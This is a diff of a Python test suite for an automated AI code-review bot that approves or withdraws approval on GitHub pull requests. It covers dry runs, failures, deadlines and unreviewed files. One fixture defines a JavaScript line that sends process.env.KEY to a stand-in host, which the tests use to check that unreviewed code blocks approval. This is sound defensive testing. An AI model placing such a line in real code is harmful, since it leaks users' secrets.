+        self.assertEqual(Run(github, FakeModel(status_error(400, "invalid_request_error"))).code, 0)
+        self.assertEqual(github.review_calls, [("DISMISS", 1, review.WITHDRAWN_UNREVIEWED)])
+        # A file-rule P1 still shows when the model fails, so the message names the P1.
+        secret = [*FILES, make_file(".env", "@@ -0,0 +1 @@\n+KEY=1")]
+        github = FakeGitHub(make_pr(changed_files=3), secret, older_reviewers, reviews=[bot_review(1, HEAD)])
+        self.assertEqual(Run(github, FakeModel(status_error(400, "invalid_request_error"))).code, 1)
+        self.assertEqual(github.review_calls, [("DISMISS", 1, review.WITHDRAWN_FOR_P1)])
+
+    def test_a_review_that_skipped_a_changed_file_never_approves(self) -> None:
+        payload = "@@ -0,0 +1 @@\n+fetch('https://example.invalid/?k=' + process.env.KEY)"
+        thing = make_file("src/lib/thing.ts")
+        big = make_file("src/lib/big.ts", payload + "\n+" + "x" * 3_000, "added")
+        # The model sees thing.ts and answers "no findings" each time, but other code never reaches it.
+        cases: dict[str, tuple[list[review.ChangedFile], int, dict[str, Any]]] = {
+            "code under a build/ directory": ([thing, make_file("src/lib/build/upload.ts", payload, "added")], 2, {}),
+            "a minified script": ([thing, make_file("src/vendor/helper.min.js", payload, "added")], 2, {}),
+            "a file GitHub sent no diff for": ([thing, make_file("src/lib/huge.ts", None)], 2, {}),
+            "a file over the budget": ([thing, big], 2, {"budget_tokens": 200}),
+            "a manifest with its lockfile": ([thing, make_file("package.json"), make_file("pnpm-lock.yaml")], 3, {}),
+            "files beyond GitHub's listing": ([thing], 3_500, {}),
+        }
+        for name, (files, changed, options) in cases.items():
+            github = FakeGitHub(make_pr(changed_files=changed), files)
+            model = FakeModel(reply_with([]))
+            run = Run(github, model, **options)
+            self.assertEqual((run.code, len(model.requests)), (0, 1), name)
+            self.assertEqual(github.review_calls, [], name)  # no approval, and none to withdraw
+            state = review.parse_state(github.comments[0].body)
+            self.assertEqual((state.status, state.complete) if state else None, ("reviewed", False), name)
+            self.assertRegex(github.comments[0].body, r"\d+ files? not reviewed</summary>", name)
+        # With an approval to withdraw, the message says why.
+        partial = [*FILES, make_file("public/logo.png", None)]
+        github = FakeGitHub(
+            make_pr(changed_files=3), partial, bot_sticky(stored_review(HEAD, fingerprint="0" * 16)), reviews=[bot_review(1, HEAD)]
+        )
+        run = Run(github, FakeModel(reply_with([])))
+        self.assertEqual(github.review_calls, [("DISMISS", 1, review.WITHDRAWN_PARTIAL)])
+        self.assertIn("since the review did not cover every changed file", run.output)
+
+    def test_no_approval_without_the_comment_it_points_to(self) -> None:
+        # Every comment write fails, so the PR has no comment at all.
+        github = FakeGitHub(make_pr(), FILES, fail=("write",))
+        run = Run(github, FakeModel(reply_with([])))
+        self.assertEqual((run.code, github.comments, github.review_calls), (0, [], []))
+        self.assertIn("could not update the review comment", run.output)
+        # The comments cannot be read, so the review runs again. The comment
+        # still shows a P1 for this same commit, so the second opinion does
+        # not approve it.
+        shown = bot_sticky(stored_review(HEAD, (P1_FINDING,)))
+        unread = FakeGitHub(make_pr(labels=("bug",)), FILES, shown, fail=("comments",), reviews=[bot_review(1, HEAD)])
+        Run(unread, FakeModel(reply_with([])))
+        self.assertEqual(unread.comments, shown)
+        self.assertEqual(unread.review_calls, [("DISMISS", 1, review.WITHDRAWN_FOR_REVIEW)])
+        self.assertEqual(approved_commits(unread), [])
+        # A comment written for one base branch is not an all clear for another.
+        older_reviewers = bot_sticky(stored_review(HEAD, fingerprint="0" * 16))
+        moved = FakeGitHub(make_pr(), FILES, older_reviewers, later_pr=make_pr(base_ref="release/1.0"), reviews=[bot_review(1, HEAD)])
+        run = Run(moved, FakeModel(reply_with([])))
+        self.assertEqual(state_of(moved.comments[0].body), (HEAD, "reviewed"))
+        self.assertEqual(moved.review_calls, [("DISMISS", 1, review.WITHDRAWN_UNCONFIRMED)])
+        self.assertIn("since the PR's base branch changed during the review", run.output)
+
+    def test_the_event_copy_fallback_withdraws_the_approval(self) -> None:
+        github = FakeGitHub(make_pr(), FILES, bot_sticky(stored_review(OLD_HEAD)), fail=("get_pull",), reviews=[bot_review(1, OLD_HEAD)])
+        run, _summary = event_run(github, event_payload(make_pr()))
+        self.assertEqual(run.code, 0)
+        self.assertEqual(github.review_calls, [("DISMISS", 1, review.WITHDRAWN_UNREVIEWED)])
+        # A stored all clear of the event's head is re-checked as usual, but
+        # the event's copy can be behind the PR, so the run withdraws.
+        stored = FakeGitHub(make_pr(), FILES, bot_sticky(stored_review(HEAD)), fail=("get_pull",), reviews=[bot_review(1, HEAD)])
+        run, _summary = event_run(stored, event_payload(make_pr(), action="labeled"))
+        self.assertEqual(run.code, 0)
+        self.assertIn("re-checks that verdict without calling the model", run.output)
+        self.assertEqual(stored.review_calls, [("DISMISS", 1, review.WITHDRAWN_UNCONFIRMED)])
+        self.assertIn("since this run could not read the PR from GitHub", run.output)
+        # Without a usable copy the run reads and writes nothing more, reviews included.
+        bare = FakeGitHub(make_pr(), FILES, fail=("get_pull",), reviews=[bot_review(1, OLD_HEAD)])
+        event_run(bare, None)
+        self.assertEqual((bare.review_calls, bare.reads), ([], ["get_pull"]))
+
+    def test_a_re_check_of_a_stored_verdict_approves_or_withdraws_like_the_review(self) -> None:
+        clean = FakeGitHub(make_pr(labels=("bug",)), FILES, bot_sticky(stored_review(HEAD)))
+        self.assertEqual(Run(clean, None).code, 0)
+        self.assertEqual(clean.review_calls, [("APPROVE", HEAD, review.APPROVAL_BODY)])
+        # A draft's finished review is re-checked like any other, so the approval follows it.
+        draft = FakeGitHub(make_pr(draft=True), FILES, bot_sticky(stored_review(HEAD)))
+        Run(draft, None)
+        self.assertEqual(approved_commits(draft), [HEAD])
+        # A stored P1 withdraws, with or without the override label.
+        for labels in ((), (review.OVERRIDE_LABEL,)):
+            p1 = FakeGitHub(make_pr(labels=labels), FILES, bot_sticky(stored_review(HEAD, (P1_FINDING,))), reviews=[bot_review(1, HEAD)])
+            Run(p1, None)
+            self.assertEqual(p1.review_calls, [("DISMISS", 1, review.WITHDRAWN_FOR_P1)], labels)
+        # A stored verdict where nothing, or not every changed file, reached the model is not an all clear.
+        nothing = review.render_review_comment(comment_inputs(head_sha=HEAD, fingerprint=FINGERPRINT, model_ran=False, usage=()))
+        skipped = (review.SkippedFile("public/logo.png", "binary file"),)
+        partial = review.render_review_comment(comment_inputs(head_sha=HEAD, fingerprint=FINGERPRINT, skipped=skipped))
+        for body, text in ((nothing, review.WITHDRAWN_UNREVIEWED), (partial, review.WITHDRAWN_PARTIAL)):
+            github = FakeGitHub(make_pr(), FILES, bot_sticky(body), reviews=[bot_review(1, HEAD)])
+            run = Run(github, None)
+            self.assertIn("re-checks that verdict without calling the model", run.output)
+            self.assertEqual(github.review_calls, [("DISMISS", 1, text)])
+        # After a retarget the same head has another diff, so its stored
+        # verdict is no all clear (the check still follows it, as before).
+        retargeted = FakeGitHub(make_pr(base_ref="release/1.0"), FILES, bot_sticky(stored_review(HEAD)), reviews=[bot_review(1, HEAD)])
+        run = Run(retargeted, None)
+        self.assertEqual(run.code, 0)
+        self.assertIn("re-checks that verdict without calling the model", run.output)
+        self.assertEqual(retargeted.review_calls, [("DISMISS", 1, review.WITHDRAWN_UNCONFIRMED)])
+        self.assertIn("since the stored review was made against another base branch", run.output)
+        # Back on the base it was reviewed against, the same verdict approves again.
+        retargeted.set_pr(make_pr())
+        Run(retargeted, None)
+        self.assertEqual(approved_commits(retargeted), [HEAD])
+
+    def test_manual_runs_and_dry_runs_never_touch_reviews(self) -> None:
+        mine = [bot_review(1, OLD_HEAD)]
+        for findings in ([], [finding("P1")]):
+            github = FakeGitHub(make_pr(), FILES, reviews=mine)
+            self.assertEqual(Run(github, FakeModel(reply_with(findings)), env=DISPATCH_ENV).code, 0)
+            self.assertEqual((github.review_calls, github.reviews, "reviews" in github.reads), ([], mine, False))
+        replayed = FakeGitHub(make_pr(), FILES, bot_sticky(stored_review(HEAD)), reviews=mine)
+        Run(replayed, None, env=DISPATCH_ENV)
+        self.assertEqual((replayed.review_calls, "reviews" in replayed.reads), ([], False))
+        # A dry run reads the reviews to say what a live run would do; NoWriteGitHub fails on any write.
+        dry = NoWriteGitHub(make_pr(), FILES, reviews=mine)
+        run = Run(dry, None, env={}, dry_run=True)
+        self.assertEqual(run.code, 0)
+        self.assertIn("would withdraw the bot's approval in review 1, since the latest push has a P1", run.output)
+        # A dry-run reviewer that still reaches the approval step crashes instead of writing.
+        runtime = review.Runtime(
+            github=NoWriteGitHub(make_pr(), FILES, reviews=mine), model_factory=lambda _k: FakeModel(), env=LIVE_ENV, out=io.StringIO()
+        )
+        reviewer = review.Reviewer(review.Options(repo=REPO, pr=7, dry_run=True), runtime)
+        for step in (review.APPROVE_HEAD, review.WITHDRAW_FOR_P1):
+            reviewer.approval = step
+            with self.assertRaises(review.ReadOnlyViolation):
+                reviewer.sync_approval(make_pr())
+        with self.assertRaises(review.ReadOnlyViolation):
+            reviewer.apply_approval(make_pr(), review.WITHDRAW_FOR_REVIEW)
+
+    def test_a_dry_run_says_what_the_approval_step_would_do(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            canned = Path(tmp, "clean.json")
+            canned.write_text(json.dumps({"summary": "Fine.", "findings": []}), encoding="utf-8")
+            fresh = Run(NoWriteGitHub(make_pr(), FILES), None, env={}, dry_run=True, canned_response=canned)
+            approved = NoWriteGitHub(make_pr(), FILES, reviews=[bot_review(1, HEAD)])
+            again = Run(approved, None, env={}, dry_run=True, canned_response=canned)
+            older = NoWriteGitHub(make_pr(), FILES, reviews=[bot_review(1, OLD_HEAD)])
+            moving = Run(older, None, env={}, dry_run=True, canned_response=canned)
+            image = [*FILES, make_file("public/logo.png", None)]
+            partial = Run(NoWriteGitHub(make_pr(changed_files=3), image), None, env={}, dry_run=True, canned_response=canned)
+        reason = "since it has no P1 and the review covered every changed file"
+        self.assertIn(f"would approve {HEAD[:7]}, {reason}. Manual runs never approve or withdraw.", fresh.output)
+        self.assertIn(review.APPROVAL_SETTING, fresh.output)
+        self.assertIn(f"would post no approval, since the bot already approves {HEAD[:7]}", again.output)
+        self.assertIn(
+            f"would approve {HEAD[:7]}, {reason}, and withdraw its approval of another commit (review 1) when the review starts",
+            moving.output,
+        )
+        self.assertIn("would withdraw nothing, since the bot has no active approval on this PR (the review did not", partial.output)
+        merged = Run(NoWriteGitHub(make_pr(state="closed"), FILES), None, env={}, dry_run=True)
+        self.assertIn("Approval step: none, since PR #7 is closed.", merged.output)
+        self.assertIn("would withdraw nothing, since the bot has no active approval on this PR", merged.output)
+        unlisted = Run(NoWriteGitHub(make_pr(), FILES, fail=("reviews",)), None, env={}, dry_run=True)
+        self.assertEqual(unlisted.code, 0)
+        self.assertIn("Approval step: could not list the PR's reviews", unlisted.output)
+
+    def test_a_refused_approval_logs_one_notice_and_changes_nothing_else(self) -> None:
+        for status in sorted(review.APPROVAL_REFUSED_STATUSES):
+            allowed = FakeGitHub(make_pr(), FILES)
+            base = Run(allowed, FakeModel(reply_with([finding("P3")])))
+            refused = FakeGitHub(make_pr(), FILES, refuse_approval=status)
+            run = Run(refused, FakeModel(reply_with([finding("P3")])))
+            self.assertEqual(run.code, base.code)
+            self.assertEqual((refused.writes, refused.comments), (allowed.writes, allowed.comments))
+            self.assertEqual([call[0] for call in refused.review_calls], ["APPROVE"])  # one try, no retry
+            annotations = [line for line in run.output.splitlines() if line.startswith("::")]
+            self.assertEqual(len(annotations), 1, annotations)
+            self.assertTrue(annotations[0].startswith("::notice::Claude review: GitHub did not let the bot approve"))
+            self.assertIn(f'an org owner has to turn on "{review.APPROVAL_SETTING}"', annotations[0])
+            self.assertIn(f"HTTP {status}: {REFUSAL}", annotations[0])
+            self.assertEqual(approved_commits(refused), [])
+        # Any other failure is a warning, and changes nothing else either. So
+        # is the same status for another cause, since the setting is not it.
+        broken = FakeGitHub(make_pr(), FILES, fail=("approve",))
+        own_pr = FakeGitHub(make_pr(), FILES, refuse_approval=422, refusal="Can not approve your own pull request")
+        for github in (broken, own_pr):
+            run = Run(github, FakeModel(reply_with([])))
+            self.assertEqual(run.code, 0)
+            self.assertIn("::warning::Claude review: could not approve", run.output)
+            self.assertNotIn(review.APPROVAL_SETTING, run.output)
+            self.assertEqual([call[0] for call in github.review_calls], ["APPROVE"])
+
+    def test_listing_or_dismissal_failures_fail_open(self) -> None:
+        for down in ("reviews", "dismiss"):
+            github = FakeGitHub(make_pr(), FILES, reviews=[bot_review(1, HEAD)], fail=(down,))
+            run = Run(github, FakeModel(reply_with([finding("P1")])))
+            self.assertEqual(run.code, 1, down)  # what the P1 gives without approvals
+            self.assertEqual(state_of(github.comments[0].body), (HEAD, "reviewed"), down)
+            self.assertIn("::warning::", run.output, down)
+            self.assertEqual(approved_commits(github), [HEAD], down)  # nothing could be withdrawn
+
+        # A bug in the step is contained the same way: the push is still reviewed and passes.
+        class BrokenReviews(FakeGitHub):
+            def list_pull_reviews(self, number: int) -> list[review.PullReview]:
+                raise RuntimeError("boom")
+
+        broken = BrokenReviews(make_pr(), FILES)
+        run = Run(broken, FakeModel(reply_with([])))
+        self.assertEqual(run.code, 0)
+        self.assertEqual(state_of(broken.comments[0].body), (HEAD, "reviewed"))
+        self.assertIn("unexpected RuntimeError in the approval step: boom", run.output)
+
+        # A read-only violation is a bug that must crash, here too.
+        class ReadOnlyReviews(FakeGitHub):
+            def approve_pull_request(self, number: int, commit_id: str, body: str) -> None:
+                raise review.ReadOnlyViolation("a write on a read-only client")
+
+        with self.assertRaises(review.ReadOnlyViolation):
+            Run(ReadOnlyReviews(make_pr(), FILES), FakeModel(reply_with([])))
+
+    def test_closed_prs_stale_events_and_moved_heads_leave_the_reviews_alone(self) -> None:
+        mine = [bot_review(1, HEAD)]
+        closed = FakeGitHub(make_pr(state="closed"), FILES, reviews=mine)
+        Run(closed, None)
+        stale = FakeGitHub(make_pr(head_sha=NEW_HEAD), FILES, reviews=mine)
+        Run(stale, None, env={**LIVE_ENV, "EVENT_HEAD_SHA": HEAD})
+        for name, github in (("closed", closed), ("stale event", stale)):
+            self.assertEqual((github.review_calls, github.reviews), ([], mine), name)
+            self.assertNotIn("reviews", github.reads, name)
+        # A head that moves during the review leaves the end of it to the
+        # newer run: the only review call is the withdrawal as it started.
+        moved = FakeGitHub(make_pr(), FILES, later_pr=make_pr(head_sha=NEW_HEAD), reviews=mine)
+        Run(moved, FakeModel(reply_with([finding("P1")])))
+        self.assertEqual(moved.review_calls, [("DISMISS", 1, review.WITHDRAWN_FOR_REVIEW)])
+        self.assertEqual(moved.reads.count("reviews"), 1)
+
+    def test_the_approval_step_stops_near_the_job_time_limit(self) -> None:
+        class SlowModel(FakeModel):
+            """A model that answers after the given time has passed."""
+
+            def __init__(self, clock: FakeClock, seconds: float, *outcomes: review.ModelReply | BaseException) -> None:
+                super().__init__(*outcomes)
+                self.clock, self.seconds = clock, seconds
+
+            def create(self, request: review.ReviewRequest, timeout: float) -> review.ModelReply:
+                self.clock.now += self.seconds
+                return super().create(request, timeout)
+
+        for seconds, approved in ((review.APPROVAL_DEADLINE_SECONDS - 1, [HEAD]), (review.APPROVAL_DEADLINE_SECONDS, [])):
+            clock = FakeClock()
+            github = FakeGitHub(make_pr(), FILES, reviews=[bot_review(1, OLD_HEAD)])
+            run = Run(github, SlowModel(clock, seconds, reply_with([])), clock=clock)
+            # The check and the comment are the review's either way.
+            self.assertEqual((run.code, state_of(github.comments[0].body)), (0, (HEAD, "reviewed")), seconds)
+            self.assertEqual(approved_commits(github), approved, seconds)
+            # The withdrawal before the review still happened; nothing at all after the deadline.
+            self.assertEqual(github.review_calls[0], ("DISMISS", 1, review.WITHDRAWN_FOR_REVIEW), seconds)
+            self.assertEqual(github.reads.count("reviews"), 2 if approved else 1, seconds)
+            self.assertEqual("close to the job's time limit" in run.output, not approved, seconds)
+
+        class SlowListing(FakeGitHub):
+            """GitHub answers the approval step's listing after the review just as time runs out."""
+
+            def __init__(self, *args: Any, **kwargs: Any) -> None:
+                super().__init__(*args, **kwargs)
+                self.clock = FakeClock()
+
+            def list_pull_reviews(self, number: int) -> list[review.PullReview]:
+                listed = super().list_pull_reviews(number)
+                if self.reads.count("reviews") == 2:
+                    self.clock.now += review.APPROVAL_DEADLINE_SECONDS
+                return listed
+
+        # So neither the approval it would post nor a withdrawal is sent after
+        # that listing. The approval of HEAD here stands while an older
+        # reviewer's clean review of HEAD is in the comment.
+        older_reviewers = bot_sticky(stored_review(HEAD, fingerprint="0" * 16))
+        for findings, reviews in (([], []), ([finding("P1")], [bot_review(1, HEAD)])):
+            github = SlowListing(make_pr(), FILES, older_reviewers, reviews=reviews)
+            run = Run(github, FakeModel(reply_with(findings)), clock=github.clock)
+            self.assertEqual(run.code, 1 if findings else 0)
+            self.assertEqual((github.review_calls, github.reviews), ([], reviews))
+            self.assertIn("close to the job's time limit", run.output)
+
+
 # --- the real GitHub client against a fake HTTP transport ------------------------------------
 
 API = "https://api.github.com/repos/o/r"
@@ -1585,6 +2390,11 @@ class GitHubApiTests(unittest.TestCase):
         page2 = [{"id": i, "user": {"login": "someone"}, "body": "hi"} for i in range(101, 200)] + [spoof]
         sticky = [{"id": 999, "user": {"login": review.BOT_LOGIN}, "body": earlier_review()}]
         comments = f"{API}/issues/7/comments?per_page=100"
+        # Reviews as GitHub lists them, over two pages: a person's approval,
+        # then this bot's approval of the head commit.
+        reviews_page2 = "https://api.github.com/repositories/123/pulls/7/reviews?per_page=100&page=2"
+        person = {"id": 1, "user": {"login": "someone"}, "state": "APPROVED", "commit_id": HEAD}
+        mine = {"id": 2, "user": {"login": review.BOT_LOGIN}, "state": "APPROVED", "commit_id": HEAD}
         return {
             ("GET", f"{API}/pulls/7"): ok(pull),
             ("GET", f"{API}/pulls/7/files?per_page=100"): ok(files),
@@ -1592,21 +2402,34 @@ class GitHubApiTests(unittest.TestCase):
             ("GET", "https://api.github.com/repositories/123/issues/7/comments?per_page=100&page=2"): ok(page2, page_link(3)),
             ("GET", "https://api.github.com/repositories/123/issues/7/comments?per_page=100&page=3"): ok(sticky),
             ("PATCH", f"{API}/issues/comments/999"): ok({}),
+            ("GET", f"{API}/pulls/7/reviews?per_page=100"): ok([person], f'<{reviews_page2}>; rel="next"'),
+            ("GET", reviews_page2): ok([mine]),
         }
 
     def test_sticky_on_the_third_page_is_patched_not_duplicated(self) -> None:
-        transport = FakeTransport(self.routes())
+        # The sticky shows an older commit's review, so the bot has no
+        # approval yet: only a person's, and the clean review adds the bot's.
+        person = {"id": 1, "user": {"login": "someone"}, "state": "APPROVED", "commit_id": HEAD}
+        routes = {
+            **self.routes(),
+            ("GET", f"{API}/pulls/7/reviews?per_page=100"): ok([person]),
+            ("POST", f"{API}/pulls/7/reviews"): ok({"id": 3, "state": "APPROVED"}),
+        }
+        transport = FakeTransport(routes)
         api = review.GitHubApi("o/r", "t0ken", allow_writes=True, transport=transport)
         runtime = review.Runtime(
             github=api, model_factory=lambda _k: FakeModel(reply_with([])), env=LIVE_ENV, out=io.StringIO(), clock=FakeClock()
         )
         self.assertEqual(review.run(review.Options(repo="o/r", pr=7), runtime), 0)
         writes = [(method, url) for method, url, _h, _b in transport.calls if method != "GET"]
-        self.assertEqual(writes, [("PATCH", f"{API}/issues/comments/999")] * 2)
+        self.assertEqual(writes, [("PATCH", f"{API}/issues/comments/999")] * 2 + [("POST", f"{API}/pulls/7/reviews")])
         for _method, url, headers, _body in transport.calls:
             self.assertTrue(url.startswith("https://api.github.com/"))
             self.assertEqual(headers["Authorization"], "Bearer t0ken")
-        final = json.loads(transport.calls[-1][3] or b"{}")["body"]
+        # The approval step reads the reviews after the comment is written, so
+        # the last call is no longer the sticky's PATCH.
+        final_patch = next(body for method, _url, _h, body in reversed(transport.calls) if method == "PATCH")
+        final = json.loads(final_patch or b"{}")["body"]
         self.assertEqual(state_of(final), (HEAD, "reviewed"))
 
     def test_http_errors_carry_the_status(self) -> None:
@@ -1634,6 +2457,52 @@ class GitHubApiTests(unittest.TestCase):
         api = review.GitHubApi("o/r", None, allow_writes=False, transport=FakeTransport({}))
         with self.assertRaisesRegex(review.GitHubError, r"returned HTTP 404: Not Found"):
             api.get_pull(1)
+
+    def test_review_calls_use_githubs_rest_shapes(self) -> None:
+        routes = {
+            **self.routes(),
+            ("POST", f"{API}/pulls/7/reviews"): ok({"id": 3, "state": "APPROVED"}),
+            ("PUT", f"{API}/pulls/7/reviews/2/dismissals"): ok({"id": 2, "state": "DISMISSED"}),
+        }
+        transport = FakeTransport(routes)
+        api = review.GitHubApi("o/r", "t0ken", allow_writes=True, transport=transport)
+        # Both pages, in GitHub's order.
+        self.assertEqual(api.list_pull_reviews(7), [review.PullReview(1, "someone", review.APPROVED, HEAD), bot_review(2, HEAD)])
+        api.approve_pull_request(7, NEW_HEAD, review.APPROVAL_BODY)
+        api.dismiss_pull_review(7, 2, review.WITHDRAWN_FOR_P1)
+        sent = [(method, url, json.loads(body)) for method, url, _h, body in transport.calls if body is not None]
+        self.assertEqual(
+            sent,
+            [
+                ("POST", f"{API}/pulls/7/reviews", {"commit_id": NEW_HEAD, "body": review.APPROVAL_BODY, "event": "APPROVE"}),
+                ("PUT", f"{API}/pulls/7/reviews/2/dismissals", {"message": review.WITHDRAWN_FOR_P1, "event": "DISMISS"}),
+            ],
+        )
+        # A read-only client refuses both before anything is sent.
+        read_only = FakeTransport({})
+        api = review.GitHubApi("o/r", "t0ken", allow_writes=False, transport=read_only)
+        with self.assertRaises(review.ReadOnlyViolation):
+            api.approve_pull_request(7, HEAD, "x")
+        with self.assertRaises(review.ReadOnlyViolation):
+            api.dismiss_pull_review(7, 2, "x")
+        self.assertEqual(read_only.calls, [])
+
+    def test_githubs_refusal_is_one_notice_through_the_real_client(self) -> None:
+        refusal = review.HttpResponse(422, {}, json.dumps({"message": REFUSAL}).encode())
+        routes = {**self.routes(), ("GET", f"{API}/pulls/7/reviews?per_page=100"): ok([]), ("POST", f"{API}/pulls/7/reviews"): refusal}
+        transport = FakeTransport(routes)
+        api = review.GitHubApi("o/r", "t0ken", allow_writes=True, transport=transport)
+        out = io.StringIO()
+        runtime = review.Runtime(
+            github=api, model_factory=lambda _k: FakeModel(reply_with([])), env=LIVE_ENV, out=out, clock=FakeClock()
+        )
+        self.assertEqual(review.run(review.Options(repo="o/r", pr=7), runtime), 0)
+        annotations = [line for line in out.getvalue().splitlines() if line.startswith("::")]
+        self.assertEqual(len(annotations), 1, annotations)
+        self.assertTrue(annotations[0].startswith("::notice::"))
+        self.assertIn(f"returned HTTP 422: {REFUSAL}", annotations[0])
+        self.assertIn(review.APPROVAL_SETTING, annotations[0])
+        self.assertEqual([url for method, url, _h, _b in transport.calls if method == "POST"], [f"{API}/pulls/7/reviews"])
 
 
 # --- the real urllib transport against a raw-socket server -------------------------------------
